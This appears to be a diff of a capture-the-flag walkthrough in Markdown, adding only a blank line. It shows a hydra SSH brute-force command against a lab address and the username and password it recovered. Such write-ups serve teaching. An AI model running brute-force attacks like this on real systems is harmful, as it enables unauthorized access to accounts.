@@ -200,6 +200,7 @@ making wordlist :
 ## hydra -l RickSanchez -P wordlist.txt ssh://10.135.36.148 -s 22222
 
 <img width="1387" height="332" alt="Screenshot 2026-03-02 at 01 09 56" src="https://github.com/user-attachments/assets/188919e0-fe72-448e-90a0-bc4a0dc5c0fb" />
+
 ## username : RickSanchez  password : P7Curtains
 
 login into the new user :
